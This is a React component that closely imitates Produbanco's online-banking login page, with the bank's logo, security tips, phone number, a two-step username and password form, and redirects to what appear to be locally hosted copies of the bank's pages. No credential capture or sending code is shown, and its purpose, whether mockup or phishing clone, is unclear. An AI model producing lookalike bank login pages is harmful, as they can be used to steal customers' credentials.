import { useEffect, useState, type FormEvent } from 'react'
import { Link, useSearchParams } from 'react-router-dom'

export function BancaEnLinea() {
  const [params] = useSearchParams()
  const tipo = params.get('tipo') || 'personas'
  const [usuario, setUsuario] = useState('')
  const [paso, setPaso] = useState<'usuario' | 'clave'>('usuario')

  useEffect(() => {
    if (tipo === 'personas') {
      window.location.replace('/produnet/index.html')
    }
    if (tipo === 'empresas') {
      window.location.replace('/empresas/index.html')
    }
  }, [tipo])

  function onContinue(event: FormEvent) {
    event.preventDefault()
    if (paso === 'usuario' && usuario.trim()) {
      setPaso('clave')
    }
  }

  return (
    <div className="banca-page">
      <div className="banca-left">
        <div className="banca-card">
          <p className="banca-kicker">¡Recomendaciones para ti!</p>
          <ul>
            <li>
              <span className="banca-ico" aria-hidden="true" />
              No compartas tu usuario y contraseña por correo electrónico, llamadas o mensajes.
            </li>
            <li>
              <span className="banca-ico" aria-hidden="true" />
              Para ingresar a Produbanco en línea, se solicitará tu factor de seguridad configurado.
            </li>
            <li>
              <span className="banca-ico" aria-hidden="true" />
              Verifica que la dirección web en tu navegador sea la oficial de Produbanco.
            </li>
          </ul>
        </div>
        <div className="banca-card">
          <p className="banca-kicker">¿No puedes ingresar?</p>
          <p>Si tienes problemas para ingresar, comunícate al:</p>
          <strong>02 400 9000</strong>
        </div>
        <p className="banca-copy">© 2026 Produbanco. Todos los derechos reservados</p>
      </div>

      <div className="banca-right">
        <form className="banca-box" onSubmit={onContinue}>
          <img className="banca-logo" src="/original/logo.png" alt="Produbanco Grupo Promerica" />
          <h1>Hola, te damos la bienvenida</h1>
          {tipo === 'personas' ? null : (
            <p className="banca-tipo">
              {tipo === 'empresas' ? 'Banca de Empresas' : 'Cash Management'}
            </p>
          )}
          {paso === 'usuario' ? (
            <>
              <label className="banca-field">
                Usuario
                <input
                  name="usuario"
                  autoComplete="off"
                  placeholder="Ingresa tu nombre de usuario"
                  value={usuario}
                  onChange={(event) => setUsuario(event.target.value)}
                />
              </label>
              <button className="banca-submit" type="submit">
                Continuar
              </button>
              <span className="banca-help static-link">
                ¿Olvidaste tu usuario o quieres desbloquearlo?
              </span>
            </>
          ) : (
            <>
              <label className="banca-field">
                Contraseña
                <input name="clave" type="password" autoComplete="off" placeholder="Ingresa tu contraseña" />
              </label>
              <button className="banca-submit" type="submit">
                Continuar
              </button>
              <span className="banca-help static-link">¿Olvidaste tu contraseña?</span>
            </>
          )}
          <Link className="banca-back" to="/">
            Volver al inicio
          </Link>
        </form>
      </div>
    </div>
  )
}
